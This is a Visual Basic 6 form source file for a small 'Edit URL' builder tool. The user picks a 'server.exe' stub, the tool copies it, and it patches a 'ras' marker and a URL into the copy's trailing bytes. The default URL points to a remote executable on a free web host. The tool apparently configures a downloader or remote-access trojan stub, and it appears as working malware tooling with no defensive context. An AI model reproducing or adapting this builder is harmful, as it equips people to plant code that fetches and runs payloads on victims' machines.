VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   Caption         =   "Edit"
   ClientHeight    =   1440
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   7155
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   1440
   ScaleWidth      =   7155
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   720
      Top             =   960
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Action"
      Height          =   495
      Left            =   3000
      TabIndex        =   2
      Top             =   840
      Width           =   735
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Text            =   "http://www.gratisweb.com/garrochoman/Mgsdll32.exe"
      Top             =   480
      Width           =   6975
   End
   Begin VB.Image Image1 
      Height          =   480
      Left            =   0
      Picture         =   "Form1.frx":0CCA
      Top             =   0
      Width           =   480
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Edit URL:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   2760
      TabIndex        =   0
      Top             =   120
      Width           =   1320
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim url As String * 200
Dim ras As String * 3
Private Sub Command1_Click()
With CommonDialog1
  .CancelError = True
  .DialogTitle = "Open server"
  .Filter = "Server.exe|server.exe"
  .ShowOpen
  If Len(.FileName) = 0 Then Exit Sub
  FileCopy .FileName, App.Path & "\" & "Mgsad.exe"
  url = Trim(Text1)
  Open App.Path & "\" & "Mgsad.exe" For Binary As #1
  Seek #1, LOF(1) - 203
  Put #1, , "ras"
  Put #1, , url
  Close #1
  MsgBox "data have Save satisfactorily", vbInformation, "Edit"
End With
End Sub
